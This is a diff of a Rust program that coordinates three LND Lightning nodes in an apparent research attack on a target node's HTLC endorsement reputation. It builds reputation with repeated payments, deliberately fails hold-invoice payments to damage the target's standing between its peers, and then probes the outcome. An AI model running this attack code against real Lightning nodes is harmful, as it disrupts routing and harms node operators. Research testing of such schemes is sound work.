@@ -1,278 +1,218 @@
 use tokio::time::{sleep, Duration};
 
+mod attack;
+mod client;
+use std::sync::Arc;
+
+// Alice
 const LND_0_RPCSERVER: &str = env!("LND_0_RPCSERVER");
 const LND_0_CERT: &str = env!("LND_0_CERT");
 const LND_0_MACAROON: &str = env!("LND_0_MACAROON");
 
+// Bob
 const LND_1_RPCSERVER: &str = env!("LND_1_RPCSERVER");
 const LND_1_CERT: &str = env!("LND_1_CERT");
 const LND_1_MACAROON: &str = env!("LND_1_MACAROON");
 
-const _LND_2_RPCSERVER: &str = env!("LND_2_RPCSERVER");
-const _LND_2_CERT: &str = env!("LND_2_CERT");
-const _LND_2_MACAROON: &str = env!("LND_2_MACAROON");
+// Charlie
+const LND_2_RPCSERVER: &str = env!("LND_2_RPCSERVER");
+const LND_2_CERT: &str = env!("LND_2_CERT");
+const LND_2_MACAROON: &str = env!("LND_2_MACAROON");
 
 const TARGET: &str = env!("TARGET");
 
 #[tokio::main]
 async fn main() {
-    let mut alice = Client(
-        fedimint_tonic_lnd::connect(
-            format!("https://{}:10009", LND_0_RPCSERVER),
-            LND_0_CERT,
-            LND_0_MACAROON,
-        )
+    let mut alice = client::new_client(LND_0_RPCSERVER, LND_0_CERT, LND_0_MACAROON)
         .await
-        .unwrap(),
-    );
-    let mut bob = Client(
-        fedimint_tonic_lnd::connect(
-            format!("https://{}:10009", LND_1_RPCSERVER),
-            LND_1_CERT,
-            LND_1_MACAROON,
-        )
+        .unwrap();
+    let mut bob = client::new_client(LND_1_RPCSERVER, LND_1_CERT, LND_1_MACAROON)
         .await
-        .unwrap(),
-    );
+        .unwrap();
 
+    let mut charlie = client::new_client(LND_2_RPCSERVER, LND_2_CERT, LND_2_MACAROON)
+        .await
+        .unwrap();
 
-    let target_peers = alice.graph_get_node_peers(String::from(TARGET)).await;
-    alice
-        .open_channel(target_peers[1].clone(), 500_000, 0)
-        .await;
-    bob.open_channel(target_peers[2].clone(), 500_000, 250_000)
-        .await;
-    println!("Please confirm the channels!");
-    std::io::stdin().read_line(&mut String::new()).unwrap();
+    let target_peers = alice.graph_get_node_peers(TARGET.to_string()).await;
 
-    let hash_table = gen_hash_table(10);
+    let front_peer = &target_peers[0];
+    let back_peer = &target_peers[1];
 
-    for (i, (preimage, hash)) in hash_table.iter().enumerate() {
-        println!("generating invoice...");
-        let invoice = bob.add_hold_invoice(hash.to_vec(), 1000).await;
-        println!("sending payment...");
-        alice.send_payment(invoice.to_string()).await;
-        println!("payment sent! settling invoice...");
-        sleep(Duration::from_secs(3)).await;
-        bob.settle_invoice(preimage.to_vec()).await;
-        // prints whether the inbound htlcs to pay that invoice were endorsed
-        bob.lookup_invoice(hash.to_vec()).await;
-        println!("settled invoice: {}, {}", i, hex::encode(hash));
-    }
-}
+    let arg = std::env::args().nth(1);
+    match arg {
+        Some(a) => {
+            if a == "oc" {
+                println!("Opening channels to peers and target");
+                // have two front-attackers (A & C) open channels to the target
+                attack::open_to_targets(&mut alice, vec![front_peer.clone()])
+                    .await
+                    .unwrap();
 
-struct Client(fedimint_tonic_lnd::Client);
+                // The back-attacker (B) opens a channel to the third target
+                attack::open_to_targets(&mut bob, vec![back_peer.clone()])
+                    .await
+                    .unwrap();
 
-#[allow(dead_code)]
-impl Client {
-    async fn get_pubkey(&mut self) -> String {
-        self.0
-            .lightning()
-            .get_info(fedimint_tonic_lnd::lnrpc::GetInfoRequest {})
-            .await
-            .unwrap()
-            .into_inner()
-            .identity_pubkey
-    }
-
-    async fn graph_get_node_peers(&mut self, node_pubkey: String) -> Vec<String> {
-        let channels = self
-            .0
-            .lightning()
-            .get_node_info(fedimint_tonic_lnd::lnrpc::NodeInfoRequest {
-                pub_key: node_pubkey.clone(),
-                include_channels: true,
-            })
-            .await
-            .unwrap()
-            .into_inner()
-            .channels;
-        channels
-            .iter()
-            .map(|channel| {
-                if channel.node1_pub == node_pubkey {
-                    channel.node2_pub.clone()
-                } else {
-                    channel.node1_pub.clone()
-                }
-            })
-            .collect()
-    }
-
-    async fn open_channel(
-        &mut self,
-        node_pubkey: String,
-        local_funding_amount: i64,
-        push_sat: i64,
-    ) {
-        use fedimint_tonic_lnd::lnrpc::channel_point::FundingTxid;
-        let res = self
-            .0
-            .lightning()
-            .open_channel_sync(fedimint_tonic_lnd::lnrpc::OpenChannelRequest {
-                node_pubkey: hex::decode(&node_pubkey).unwrap(),
-                local_funding_amount,
-                push_sat,
-                ..Default::default()
-            })
-            .await
-            .unwrap()
-            .into_inner();
-        let s = match res.funding_txid.unwrap() {
-            FundingTxid::FundingTxidBytes(b) => hex::encode(b),
-            FundingTxid::FundingTxidStr(_s) => unreachable!(),
-        };
-        println!("{}", s);
-    }
-
-    async fn add_hold_invoice(&mut self, hash: Vec<u8>, value: i64) -> String {
-        self.0
-            .invoices()
-            .add_hold_invoice(fedimint_tonic_lnd::invoicesrpc::AddHoldInvoiceRequest {
-                hash,
-                value,
-                ..Default::default()
-            })
-            .await
-            .unwrap()
-            .into_inner()
-            .payment_request
-    }
-
-    async fn send_payment(&mut self, payment_request: String) {
-        let mut stream = self
-            .0
-            .router()
-            .send_payment_v2(fedimint_tonic_lnd::routerrpc::SendPaymentRequest {
-                payment_request,
-                fee_limit_sat: 100_000,
-                timeout_seconds: 100_000,
-                endorsed: 1i32,
-                ..Default::default()
-            })
-            .await
-            .unwrap()
-            .into_inner();
-        tokio::task::spawn(async move {
-            while let Some(payment) = stream.message().await.unwrap() {
-                if payment.status == 3 {
-                    println!("payment failed!");
-                } else if payment.status == 2 {
-                    println!("payment success!");
-                }
-            }
-        });
-    }
-
-    async fn settle_invoice(&mut self, preimage: Vec<u8>) {
-        let _res = self
-            .0
-            .invoices()
-            .settle_invoice(fedimint_tonic_lnd::invoicesrpc::SettleInvoiceMsg { preimage })
-            .await
-            .unwrap()
-            .into_inner();
-        //println!("{:?}", res);
-    }
-
-    async fn subscribe_invoices(&mut self) {
-        let mut invoice_stream = self
-            .0
-            .lightning()
-            .subscribe_invoices(fedimint_tonic_lnd::lnrpc::InvoiceSubscription {
-                add_index: 0,
-                settle_index: 0,
-            })
-            .await
-            .expect("Failed to call subscribe_invoices")
-            .into_inner();
-
-        tokio::task::spawn(async move {
-            while let Some(invoice) = invoice_stream
-                .message()
+                // Charlie opens channels to both peers and the target (to allow us to see the reputations of the peers)
+                attack::open_to_targets(
+                    &mut charlie,
+                    vec![TARGET.to_string(), front_peer.clone(), back_peer.clone()],
+                )
                 .await
-                .expect("Failed to receive invoices")
-            {
-                let htlcs = invoice.htlcs;
-                for htlc in htlcs {
-                    if htlc.incoming_endorsed {
-                        println!("HTLC endorsed!!");
-                    } else {
-                        println!("not endorsed");
-                    }
-                }
-            }
-        });
-    }
+                .unwrap();
 
-    async fn lookup_invoice(&mut self, r_hash: Vec<u8>) {
-        let htlcs = self
-            .0
-            .lightning()
-            .lookup_invoice(fedimint_tonic_lnd::lnrpc::PaymentHash {
-                r_hash,
-                ..Default::default()
-            })
-            .await
-            .unwrap()
-            .into_inner()
-            .htlcs;
-        for htlc in htlcs {
-            if htlc.incoming_endorsed {
-                println!("HTLC endorsed!!");
-            } else {
-                println!("not endorsed");
+                println!("Please confirm the channels!");
+                std::io::stdin().read_line(&mut String::new()).unwrap();
             }
+        }
+        None => {
+            println!("Skipping channel opening");
         }
     }
 
-    async fn connect_peer(&mut self, pubkey: String, host: String) {
-        use fedimint_tonic_lnd::lnrpc::LightningAddress;
-        let _ = self
-            .0
-            .lightning()
-            .connect_peer(fedimint_tonic_lnd::lnrpc::ConnectPeerRequest {
-                addr: Some(LightningAddress { pubkey, host }),
-                ..Default::default()
-            })
+    // 1. Alice sends payments to Charlie via front-peer to build reputation
+    let charlie_target_peer_channel = &charlie.get_channels_for_peer(TARGET.to_string()).await[0];
+    // let front_peer_channel = alice.get_channels_for_peer(front_peer.clone()).await[0];
+    println!("100x Alice <-> Charlie payments back and forth");
+    for _ in 0..100 {
+        let c_invoice = charlie.add_invoice(800_000).await;
+        let ac_stream = alice
+            .send_payment(
+                c_invoice.to_string(),
+                1,
+                None, // Some(vec![front_peer_channel.chan_id]),
+                // ensure that the payment goes through the target
+                Some(client::decode_hex(TARGET)),
+            )
+            .await;
+        alice
+            .on_payment_result(
+                ac_stream,
+                Arc::new(|_| {
+                    // println!("Alice -> Charlie payment success!");
+                }),
+            )
+            .await;
+
+        let a_invoice = alice.add_invoice(800_000).await;
+        let ca_stream = charlie
+            .send_payment(
+                a_invoice.to_string(),
+                1,
+                Some(vec![charlie_target_peer_channel.chan_id]),
+                Some(client::decode_hex(&front_peer)),
+            )
+            .await;
+        charlie
+            .on_payment_result(
+                ca_stream,
+                Arc::new(|_| {
+                    // println!("Charlie -> Alice payment success!");
+                }),
+            )
             .await;
     }
 
-    async fn new_address(&mut self) -> String {
-        self.0
-            .lightning()
-            .new_address(fedimint_tonic_lnd::lnrpc::NewAddressRequest {
-                ..Default::default()
-            })
-            .await
-            .unwrap()
-            .into_inner()
-            .address
+    // 2. Alice sends payments to Bob and fails them to destroy Target's reputation for P1<->P2
+    println!("10x Alice -> Bob failed payments");
+    let hash_table = client::gen_hash_table(10);
+    for (i, (_preimage, payment_hash)) in hash_table.iter().enumerate() {
+        let invoice = bob.add_hold_invoice(payment_hash.to_vec(), 1000).await;
+        // println!("Bob added invoice {}", i + 1);
+        // get invoice subscription before payment to avoid missing it.
+        // let b_stream = bob.get_invoice_subscription().await;
+
+        // println!("Alice -> Bob payment attempt {}", i + 1);
+        let ab_stream = alice
+            // NOTE: this gets screwed up if the payment goes through Charlie.
+            .send_payment(
+                invoice.payment_request.to_string(),
+                1,
+                None,
+                Some(client::decode_hex(&back_peer)),
+            )
+            .await;
+
+        // println!("Bob waiting for invoice accept {}", i + 1);
+        // bob.await_invoice_accepted(b_stream, payment_hash.to_vec())
+        //     .await;
+        bob.poll_invoice(payment_hash.to_vec()).await;
+
+        // println!("Bob Cancelling {}", i + 1);
+        bob.cancel_invoice(payment_hash.to_vec()).await;
+
+        alice
+            .on_payment_result(
+                ab_stream,
+                Arc::new(|payment| {
+                    if payment.status == 3 {
+                        // println!("Alice -> Bob payment failed!");
+                    }
+                }),
+            )
+            .await;
     }
 
-    async fn cancel_invoice(&mut self, payment_hash: Vec<u8>) {
-        let _res = self
-            .0
-            .invoices()
-            .cancel_invoice(fedimint_tonic_lnd::invoicesrpc::CancelInvoiceMsg { payment_hash })
-            .await
-            .unwrap()
-            .into_inner();
-        //println!("{:?}", res);
-    }
-}
+    // 3. Charlie sends payment to route[front-peer, target, back-peer, Bob] to check reputation
+    let test_payments = 20;
+    let charlie_front_peer_channel = &charlie.get_channels_for_peer(front_peer.clone()).await[0];
+    println!("Charlie -> [front-peer, target, back-peer] payment");
+    let hash_table_2 = client::gen_hash_table(test_payments);
+    for (i, (preimage, payment_hash)) in hash_table_2.iter().enumerate() {
+        let b_invoice = bob.add_hold_invoice(payment_hash.to_vec(), 800_000).await;
 
-fn gen_hash_table(n: usize) -> Vec<([u8; 32], [u8; 32])> {
-    use bitcoin_hashes::sha256;
-    use bitcoin_hashes::Hash;
-    use rand::{thread_rng, Rng};
-    let mut rng = thread_rng();
-    let mut hash_table = Vec::with_capacity(n);
-    for _ in 0..n {
-        let mut preimage = [0u8; 32];
-        rng.fill(&mut preimage[..]);
-        let hash = sha256::Hash::hash(&preimage);
-        hash_table.push((preimage, hash.to_byte_array()));
+        let c_stream = charlie
+            .send_payment(
+                b_invoice.payment_request.to_string(),
+                1,
+                Some(vec![charlie_front_peer_channel.chan_id]),
+                Some(client::decode_hex(&back_peer)),
+            )
+            .await;
+
+        println!(
+            "polling for invoice {}: {}",
+            i + 1,
+            b_invoice.payment_request
+        );
+        bob.poll_invoice(payment_hash.to_vec()).await;
+
+        bob.lookup_invoice(payment_hash.to_vec()).await;
+
+        bob.settle_invoice(preimage.to_vec()).await;
+
+        // wait for the payment to be settled
+        charlie
+            .on_payment_result(
+                c_stream,
+                Arc::new(|payment| {
+                    if payment.status == 1 {
+                        // println!("Charlie -> [front-peer, target, back-peer] payment success!");
+                    }
+                }),
+            )
+            .await;
+
+        // return the money to preserve liquidity
+        let c_invoice = charlie.add_invoice(800_000).await;
+        let b_stream = bob
+            .send_payment(
+                c_invoice.to_string(),
+                1,
+                None,
+                Some(client::decode_hex(&front_peer)),
+            )
+            .await;
+
+        bob.on_payment_result(
+            b_stream,
+            Arc::new(|payment| {
+                if payment.status == 1 {
+                    // println!("Bob -> Charlie payment success!");
+                }
+            }),
+        )
+        .await;
     }
-    hash_table
 }
